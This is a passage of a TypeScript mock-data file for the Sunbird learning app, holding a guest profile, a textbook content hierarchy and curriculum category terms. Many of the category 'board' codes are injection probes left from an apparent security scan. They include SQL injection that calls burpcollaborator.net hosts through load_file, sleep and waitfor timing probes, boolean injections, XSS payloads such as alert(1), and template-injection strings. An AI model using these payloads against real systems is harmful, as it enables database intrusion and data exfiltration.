import { ProfileType, UserSource } from 'sunbird';
export const mockRes = {
  data: [{
    'contentType': 'textbook',
    'identifier': 'do_21252111813225676812977',
    'isAvailableLocally': true,
    'isUpdateAvailable': false,
  }],
  profile: {
    'age': 1,
    'avatar': 'avatar',
    'createdAt': 'Oct 8, 2018 4:29:43 PM',
    'day': -1,
    'gender': '',
    'handle': 'Guest1',
    'isGroupUser': false,
    'language': 'en',
    'month': -1,
    'profileType': ProfileType.TEACHER,
    'source': UserSource.LOCAL,
    'standard': -1,
    'uid': '1af7a5c0-a710-4e0b-99e7-de8fe02ecd92',
    'medium': [
      'english'
    ],
    'subject': [
      'english'
    ],
    'syllabus': [
      'NCF'
    ],
    'board': [
      'icse'
    ],
    'grade': [
      'grade5'
    ],
    'gradeValueMap': {
      'grade5': 'Class 5'
    }
  },

  getChildContentAPIResponse: {
    'message': 'successful',
    'result': {
      'basePath': '/storage/emulated/0/Android/data/org.sunbird.app.staging/files/content/do_2125409291287838721305',
      'children': [
        {
          'basePath': '/storage/emulated/0/Android/data/org.sunbird.app.staging/files/content/do_2125409300562001921307',
          'children': [
            {
              'basePath': '/storage/emulated/0/Android/data/org.sunbird.app.staging/files/content/do_2125408197067243521145',
              'contentData': {
                'appIcon': 'do_2125408197067243521145/14_1521560001068.png',
                'artifactUrl': 'do_2125408197067243521145/1530862066768_do_2125408197067243521145.zip',
                'audience': [
                  'Learner'
                ],
                'board': 'CBSE',
                'channel': '012315809814749184151',
                'contentDisposition': 'inline',
                'contentEncoding': 'gzip',
                'contentType': 'Resource',
                'createdBy': '659b011a-06ec-4107-84ad-955e16b0a48a',
                'createdOn': '2018-07-06T07:23:00.606+0000',
                'creator': 'sunbird123 Test',
                'description': 'fgfd',
                'downloadUrl': 'do_2125408197067243521145/1530862066768_do_2125408197067243521145.zip',
                'framework': 'NCF',
                'gradeLevel': [
                  'Class 1'
                ],
                'identifier': 'do_2125408197067243521145',
                'language': [
                  'English'
                ],
                'lastPublishedOn': '2018-07-06T07:27:47.118+0000',
                'medium': 'Odia',
                'mimeType': 'application/vnd.ekstep.ecml-archive',
                'name': '9302',
                'osId': 'org.ekstep.quiz.app',
                'pkgVersion': '1.0',
                'previewUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/content/ecml/do_2125408197067243521145-latest',
                'resourceType': 'Learn',
                'size': '159320.0',
                'status': 'Live',
                'subject': 'English',
                'variants': {
                  'spine': {
                    'ecarUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/ecar_files//.0_spine.ecar',
                    'size': 154870
                  }
                },
                'versionKey': '1530862066459'
              },
              'contentType': 'resource',
              'hierarchyInfo': [
                {
                  'contentType': 'textbook',
                  'identifier': 'do_2125409291287838721305'
                },
                {
                  'contentType': 'textbookunit',
                  'identifier': 'do_2125409300562001921307'
                }
              ],
              'identifier': 'do_2125408197067243521145',
              'isAvailableLocally': false,
              'isUpdateAvailable': false,
              'lastUpdatedTime': 1538998811000,
              'mimeType': 'application/vnd.ekstep.ecml-archive',
              'referenceCount': 1,
              'sizeOnDevice': 148379
            },
            {
              'basePath': '/storage/emulated/0/Android/data/org.sunbird.app.staging/files/content/do_2125408292701716481152',
              'contentData': {
                'appIcon': 'do_2125408292701716481152/77cce66eb64ef6aba60556856b140a19_1528529570221.jpg',
                'artifactUrl': 'do_2125408292701716481152/7mb-webm.webm',
                'audience': [
                  'Learner'
                ],
                'board': 'ICSE',
                'channel': '012315809814749184151',
                'contentDisposition': 'inline',
                'contentEncoding': 'identity',
                'contentType': 'Resource',
                'createdBy': '659b011a-06ec-4107-84ad-955e16b0a48a',
                'createdOn': '2018-07-06T07:42:28.019+0000',
                'creator': 'sunbird123 Test',
                'description': 'testing',
                'downloadUrl': 'do_2125408292701716481152/7mb-webm.webm',
                'framework': 'NCF',
                'gradeLevel': [
                  'Class 5'
                ],
                'identifier': 'do_2125408292701716481152',
                'language': [
                  'English'
                ],
                'lastPublishedOn': '2018-07-06T07:45:46.395+0000',
                'medium': 'Hindi',
                'mimeType': 'video/webm',
                'name': 'drdds',
                'osId': 'org.ekstep.quiz.app',
                'pkgVersion': '1.0',
                'previewUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/assets/do_2125408292701716481152/7mb-webm.webm',
                'resourceType': 'Learn',
                'size': '8397798.0',
                'status': 'Live',
                'subject': 'Mathematics',
                'variants': {
                  'spine': {
                    'ecarUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/ecar_files//.0_spine.ecar',
                    'size': 96867
                  }
                },
                'versionKey': '1530863145998'
              },
              'contentType': 'resource',
              'hierarchyInfo': [
                {
                  'contentType': 'textbook',
                  'identifier': 'do_2125409291287838721305'
                },
                {
                  'contentType': 'textbookunit',
                  'identifier': 'do_2125409300562001921307'
                }
              ],
              'identifier': 'do_2125408292701716481152',
              'isAvailableLocally': false,
              'isUpdateAvailable': false,
              'lastUpdatedTime': 1538998811000,
              'mimeType': 'video/webm',
              'referenceCount': 1,
              'sizeOnDevice': 55980
            },
            {
              'basePath': '/storage/emulated/0/Android/data/org.sunbird.app.staging/files/content/do_2125408788222361601227',
              'contentData': {
                'appIcon': 'do_2125408788222361601227/10_1521559877466.png',
                'artifactUrl': 'do_2125408788222361601227/1530869051329_do_2125408788222361601227.zip',
                'audience': [
                  'Learner'
                ],
                'board': 'NCERT',
                'channel': '012315809814749184151',
                'contentDisposition': 'inline',
                'contentEncoding': 'gzip',
                'contentType': 'Resource',
                'createdBy': '659b011a-06ec-4107-84ad-955e16b0a48a',
                'createdOn': '2018-07-06T09:23:16.855+0000',
                'creator': 'sunbird123 Test',
                'description': 'Untitled Collection',
                'downloadUrl': 'do_2125408788222361601227/1530869051329_do_2125408788222361601227.zip',
                'framework': 'NCF',
                'gradeLevel': [
                  'KG'
                ],
                'identifier': 'do_2125408788222361601227',
                'language': [
                  'English'
                ],
                'lastPublishedOn': '2018-07-06T09:24:11.593+0000',
                'medium': 'Hindi',
                'mimeType': 'application/vnd.ekstep.ecml-archive',
                'name': 'RESOURCE AR',
                'osId': 'org.ekstep.quiz.app',
                'pkgVersion': '1.0',
                'previewUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/content/ecml/do_2125408788222361601227-latest',
                'resourceType': 'Learn',
                'size': '14517.0',
                'status': 'Live',
                'subject': 'Mathematics',
                'variants': {
                  'spine': {
                    'ecarUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/ecar_files//resource-.0_spine.ecar',
                    'size': 6317
                  }
                },
                'versionKey': '1530869050852'
              },
              'contentType': 'resource',
              'hierarchyInfo': [
                {
                  'contentType': 'textbook',
                  'identifier': 'do_2125409291287838721305'
                },
                {
                  'contentType': 'textbookunit',
                  'identifier': 'do_2125409300562001921307'
                }
              ],
              'identifier': 'do_2125408788222361601227',
              'isAvailableLocally': false,
              'isUpdateAvailable': false,
              'lastUpdatedTime': 1538998811000,
              'mimeType': 'application/vnd.ekstep.ecml-archive',
              'referenceCount': 1,
              'sizeOnDevice': 12867
            },
            {
              'basePath': '/storage/emulated/0/Android/data/org.sunbird.app.staging/files/content/do_2125409169472389121297',
              'contentData': {
                'appIcon': 'do_2125409169472389121297/1202-600x375_1525346858145.jpg',
                'artifactUrl': 'do_2125409169472389121297/beyond-good-and-evil-galbraithcolor.epub',
                'audience': [
                  'Learner'
                ],
                'board': 'CBSE',
                'channel': '012315809814749184151',
                'contentDisposition': 'inline',
                'contentEncoding': 'gzip',
                'contentType': 'Resource',
                'createdBy': '659b011a-06ec-4107-84ad-955e16b0a48a',
                'createdOn': '2018-07-06T10:40:50.785+0000',
                'creator': 'sunbird123 Test',
                'description': 'uhsdif oisjdf oijaesd oiqjwd oijqs',
                'downloadUrl': 'do_2125409169472389121297/beyond-good-and-evil-galbraithcolor.epub',
                'framework': 'NCF',
                'gradeLevel': [
                  'Class 5'
                ],
                'identifier': 'do_2125409169472389121297',
                'language': [
                  'English'
                ],
                'lastPublishedOn': '2018-07-06T10:45:40.227+0000',
                'medium': 'English',
                'mimeType': 'application/epub',
                'name': 'Epub',
                'osId': 'org.ekstep.quiz.app',
                'pkgVersion': '1.0',
                'previewUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/assets/-good-and-evil-galbraithcolor.epub',
                'resourceType': 'Learn',
                'size': '1112204.0',
                'status': 'Live',
                'subject': 'English',
                'variants': {
                  'spine': {
                    'ecarUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/ecar_files/.0_spine.ecar',
                    'size': 25640
                  }
                },
                'versionKey': '1530873939854'
              },
              'contentType': 'resource',
              'hierarchyInfo': [
                {
                  'contentType': 'textbook',
                  'identifier': 'do_2125409291287838721305'
                },
                {
                  'contentType': 'textbookunit',
                  'identifier': 'do_2125409300562001921307'
                }
              ],
              'identifier': 'do_2125409169472389121297',
              'isAvailableLocally': false,
              'isUpdateAvailable': false,
              'lastUpdatedTime': 1538998811000,
              'mimeType': 'application/epub',
              'referenceCount': 1,
              'sizeOnDevice': 18125
            },
            {
              'basePath': '/storage/emulated/0/Android/data/org.sunbird.app.staging/files/content/do_2125408149114388481143',
              'contentData': {
                'appIcon': 'do_2125408149114388481143/1485698467119_1528529612978.jpg',
                'artifactUrl': 'do_2125408149114388481143/1530861483084_do_2125408149114388481143.zip',
                'audience': [
                  'Learner'
                ],
                'board': 'CBSE',
                'channel': 'in.ekstep',
                'contentDisposition': 'inline',
                'contentEncoding': 'gzip',
                'contentType': 'Resource',
                'createdBy': '659b011a-06ec-4107-84ad-955e16b0a48a',
                'createdOn': '2018-07-06T07:16:30.351+0000',
                'creator': 'sunbird123 Test',
                'description': 'dsc',
                'downloadUrl': 'do_2125408149114388481143/1530861483084_do_2125408149114388481143.zip',
                'framework': 'NCF',
                'gradeLevel': [
                  'Class 1'
                ],
                'identifier': 'do_2125408149114388481143',
                'language': [
                  'English'
                ],
                'lastPublishedOn': '2018-07-06T07:18:03.304+0000',
                'medium': 'Telugu',
                'mimeType': 'application/vnd.ekstep.ecml-archive',
                'name': '9092',
                'osId': 'org.ekstep.quiz.app',
                'pkgVersion': '2.0',
                'previewUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/content/ecml/do_2125408149114388481143-latest',
                'resourceType': 'Learn',
                'size': '83931.0',
                'status': 'Live',
                'subject': 'Telugu',
                'variants': {
                  'spine': {
                    'ecarUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/ecar_files//.0_spine.ecar',
                    'size': 79534
                  }
                },
                'versionKey': '1530861482911'
              },
              'contentType': 'resource',
              'hierarchyInfo': [
                {
                  'contentType': 'textbook',
                  'identifier': 'do_2125409291287838721305'
                },
                {
                  'contentType': 'textbookunit',
                  'identifier': 'do_2125409300562001921307'
                }
              ],
              'identifier': 'do_2125408149114388481143',
              'isAvailableLocally': false,
              'isUpdateAvailable': false,
              'lastUpdatedTime': 1538998811000,
              'mimeType': 'application/vnd.ekstep.ecml-archive',
              'referenceCount': 1,
              'sizeOnDevice': 48846
            }
          ],
          'contentData': {
            'audience': [
              'Learner'
            ],
            'contentDisposition': 'inline',
            'contentEncoding': 'gzip',
            'contentType': 'TextBookUnit',
            'createdOn': '2018-07-06T11:07:31.001+0000',
            'description': 'ge ew oiuwef oiqjwd oiueoqe qwdg ftrqw tqwfd',
            'dialcodes': [
              '646X5X'
            ],
            'identifier': 'do_2125409300562001921307',
            'language': [
              'English'
            ],
            'lastPublishedOn': '2018-07-06T11:10:10.213+0000',
            'mimeType': 'application/vnd.ekstep.content-collection',
            'name': 'book',
            'osId': 'org.ekstep.launcher',
            'pkgVersion': '1.0',
            'size': '359155.0',
            'status': 'Live',
            'variants': {
              'spine': {
                'ecarUrl': 'https://ekstep-public-qa.s3-ap-south-1.amazonaws.com/ecar_files//.0_spine.ecar',
                'size': 359155
              }
            },
            'versionKey': '1530875251001'
          },
          'contentType': 'textbookunit',
          'hierarchyInfo': [
            {
              'contentType': 'textbook',
              'identifier': 'do_2125409291287838721305'
            },
            {
              'contentType': 'textbookunit',
              'identifier': 'do_2125409300562001921307'
            }
          ],
          'identifier': 'do_2125409300562001921307',
          'isAvailableLocally': true,
          'isUpdateAvailable': false,
          'lastUpdatedTime': 1538998811000,
          'mimeType': 'application/vnd.ekstep.content-collection',
          'referenceCount': 1,
          'sizeOnDevice': 299974
        }
      ],
      'contentData': {
        'appIcon': 'do_2125409291287838721305/1_1521559683246.png',
        'audience': [
          'Learner'
        ],
        'board': 'ICSE',
        'channel': '012315809814749184151',
        'contentDisposition': 'inline',
        'contentEncoding': 'gzip',
        'contentType': 'TextBook',
        'createdBy': '659b011a-06ec-4107-84ad-955e16b0a48a',
        'createdOn': '2018-07-06T11:05:37.791+0000',
        'creator': 'sunbird123 Test',
        'description': 'jgdi fast uyfc tyfast iud pl asodjo iosdj',
        'framework': 'NCF',
        'gradeLevel': [
          'Class 5'
        ],
        'identifier': 'do_2125409291287838721305',
        'language': [
          'English'
        ],
        'lastPublishedOn': '2018-07-06T11:10:11.099+0000',
        'medium': 'English',
        'mimeType': 'application/vnd.ekstep.content-collection',
        'name': 'book',
        'osId': 'org.ekstep.quiz.app',
        'pkgVersion': '1.0',
        'resourceType': 'Book',
        'status': 'Live',
        'subject': 'English',
        'versionKey': '1530875410154'
      },
      'contentType': 'textbook',
      'hierarchyInfo': [
        {
          'contentType': 'textbook',
          'identifier': 'do_2125409291287838721305'
        }
      ],
      'identifier': 'do_2125409291287838721305',
      'isAvailableLocally': true,
      'isUpdateAvailable': false,
      'lastUpdatedTime': 1538998811000,
      'mimeType': 'application/vnd.ekstep.content-collection',
      'referenceCount': 1,
      'sizeOnDevice': 581091
    },
    'status': true
  },

  syllabusDetailsAPIResponse: [
    {
      'name': 'State (Andhra Pradesh)',
      'frameworkId': 'ap_k-12_13'
    },
    {
      'name': 'State (Maharashtra)',
      'frameworkId': 'mh_k-12_15'
    },
    {
      'name': 'State (Rajasthan)',
      'frameworkId': 'rj_k-12_1'
    },
    {
      'name': 'State (Uttar Pradesh)',
      'frameworkId': 'up_k-12_3'
    },
    {
      'name': 'NCF-Translation-Testing',
      'frameworkId': 'NCFCOPY'
    },
    {
      'name': 'Common',
      'frameworkId': 'NCF'
    }
  ],

  categoryResponse: [
    {
      'identifier': 'ncf_board',
      'code': 'board',
      'name': 'Curriculum',
      'description': '',
      'index': 1,
      'status': 'Live',
      'translations': '{"en":"board"}',
      'terms': [
        {
          'identifier': 'ncf_board_ncert',
          'code': 'ncert',
          'name': 'NCERT',
          'description': '',
          'index': 1,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_cbse',
          'code': 'cbse',
          'name': 'CBSE',
          'description': '',
          'index': 2,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_icse',
          'code': 'icse',
          'name': 'ICSE',
          'description': '',
          'index': 3,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_upboard',
          'code': 'upboard',
          'name': 'State (Uttar Pradesh)',
          'description': 'State (Uttar Pradesh)',
          'index': 4,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_apboard',
          'code': 'apboard',
          'name': 'State (Andhra Pradesh)',
          'description': 'State (Andhra Pradesh)',
          'index': 5,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_tnboard',
          'code': 'tnboard',
          'name': 'State (Tamil Nadu)',
          'description': 'State (Tamil Nadu)',
          'index': 6,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_ncte',
          'code': 'ncte',
          'name': 'NCTE',
          'description': '',
          'index': 7,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_mscert',
          'code': 'mscert',
          'name': 'State (Maharashtra)',
          'description': 'State (Maharashtra)',
          'index': 8,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_bser',
          'code': 'bser',
          'name': 'State (Rajasthan)',
          'description': 'State (Rajasthan)',
          'index': 9,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_others',
          'code': 'others',
          'name': 'Other',
          'description': 'Other',
          'index': 10,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka',
          'code': 'dscertka',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 11,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_azlp7incgl',
          'code': 'azlp7incgl',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 12,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_547kjjl201aq3sz0nlyfp',
          'code': '547kjjl201Áq3sz0nlyfp',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 13,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_k1ycpt74n7ay95bgz4ugr',
          'code': 'k1ycpt74n7Á\u0001y95bgz4ugr',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 14,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_kxry7v2xwya6j4pt7kgqe',
          'code': 'kxry7v2xwy%416j4pt7kgqe',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 15,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_lhqws2z7gzl0hsnnqygx',
          'code': 'lhqws2z7gz\\\\l0hsnnqygx',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 16,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_yojaih5kbj651vj9ohdg5f',
          'code': 'yojaih5kbj&#65;1vj9ohdg5f',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 17,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkag516nfaa82',
          'code': 'dscertkag516nfaa82',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 18,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka6tdmj7tqv8aam5cmpfgh3',
          'code': 'dscertka6tdmj7tqv8Áam5cmpfgh3',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 19,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkacuu082rkljakwhphulgsb',
          'code': 'dscertkacuu082rkljÁ\u0001kwhphulgsb',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 20,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkabomw45zvh7amjhl8195tn',
          'code': 'dscertkabomw45zvh7%41mjhl8195tn',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 21,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkattx0qsrigsltynujviek',
          'code': 'dscertkattx0qsrigs\\\\ltynujviek',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 22,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkan1jt0mynbm65ke9qojf75r',
          'code': 'dscertkan1jt0mynbm&#65;ke9qojf75r',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 23,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_select-load_filesfbkqs5uupyawygo4kyiglfk0b64zsquem1fp4.burpcollaborator.netcjm',
          'code': '(select load_file(\'\\\\\\\\sfbkqs5uupyawygo4kyiglfk0b64zsquem1fp4.burpcollaborator.net\\\\cjm\'))',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 30,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-select-load_filer80jjrytnor9px9nxjrh9k8jtaz3srju7mufi4.burpcollaborator.netxzd',
          'code': 'dscertka\'+(select load_file(\'\\\\\\\\r80jjrytnor9px9nxjrh9k8jtaz3srju7mufi4.burpcollaborator.net\\\\xzd\'))+\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 31,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaselectfromselectsleep20a',
          'code': 'dscertka\'(select*from(select(sleep(20)))a)\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 32,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-selectfromselectsleep20a',
          'code': 'dscertka\'+(select*from(select(sleep(20)))a)+\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 33,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-selectfromselectsleep20a',
          'code': 'dscertka\' and (select*from(select(sleep(20)))a)-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 34,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-waitfor-delay0020',
          'code': 'dscertka\' waitfor delay\'0:0:20\'--',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 35,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkawaitfor-delay0020',
          'code': 'dscertka\')waitfor delay\'0:0:20\'--',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 36,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka0waitfor-delay0020',
          'code': 'dscertka\',0)waitfor delay\'0:0:20\'--',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 37,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka73044181-or-63586358',
          'code': 'dscertka73044181\' or \'6358\'=\'6358',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 38,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka17202854-or-63666368',
          'code': 'dscertka17202854\' or \'6366\'=\'6368',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 39,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka11481261-or-51965196',
          'code': 'dscertka11481261\' or \'5196\'=\'5196',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 40,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka82433858-or-73977397',
          'code': 'dscertka82433858\' or \'7397\'=\'7397\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 41,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka78625017-or-83638363',
          'code': 'dscertka78625017\' or 8363=8363-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 42,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka58576030-or-13611370',
          'code': 'dscertka58576030\' or 1361=1370-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 43,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka78115724-or-40364036',
          'code': 'dscertka78115724\' or 4036=4036-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 44,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka29006136-or-19691969',
          'code': 'dscertka29006136\' or 1969=1969\'-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 45,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-93059305',
          'code': 'dscertka\' and \'9305\'=\'9305',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 46,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-74737481',
          'code': 'dscertka\' and \'7473\'=\'7481',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 47,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-43714371',
          'code': 'dscertka\' and \'4371\'=\'4371',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 48,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-47884788',
          'code': 'dscertka\' and \'4788\'=\'4788\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 49,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-87038703',
          'code': 'dscertka\' and 8703=8703-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 50,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-62526254',
          'code': 'dscertka\' and 6252=6254-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 51,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-18011801',
          'code': 'dscertka\' and 1801=1801-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 52,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-51595159',
          'code': 'dscertka\' and 5159=5159\'-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 53,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaalert1',
          'code': 'dscertkaalert(1)',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 54,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaconfirm1',
          'code': 'dscertkaconfirm(1)',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 55,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaprompt1',
          'code': 'dscertkaprompt(1)',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 56,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkadocument.location1',
          'code': 'dscertkadocument.location=1',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 57,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkadocument.title1',
          'code': 'dscertkadocument.title=1',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 58,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkazsq9kalgyrk',
          'code': 'dscertkazsq9k<a>lgyrk',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 59,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkauuei19lpiq',
          'code': 'dscertkauuei19lpiq><',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 60,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_alert1',
          'code': 'alert(1)',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 61,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_confirm1',
          'code': 'confirm(1)',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 62,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_prompt1',
          'code': 'prompt(1)',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 63,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_document.location1',
          'code': 'document.location=1',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 64,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_document.title1',
          'code': 'document.title=1',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 65,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_jeo5aaiuytp',
          'code': 'jeo5a<a>iuytp',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 66,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_uxvf5qenmr',
          'code': 'uxvf5qenmr><',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 67,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_q8a2e741540f0656',
          'code': 'q8a2e${741*540}f0656',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 68,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_furzh897861y2vp1',
          'code': 'furzh{{897*861}}y2vp1',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 69,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkabb468ue64o',
          'code': 'dscertka}}bb468\'/"<ue64o',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 70,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaenv7kcgyyx',
          'code': 'dscertka%}env7k\'/"<cgyyx',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 71,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaliywkttxasa9uil',
          'code': 'dscertkaliywk%>ttxas\'/"<a9uil',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 72,
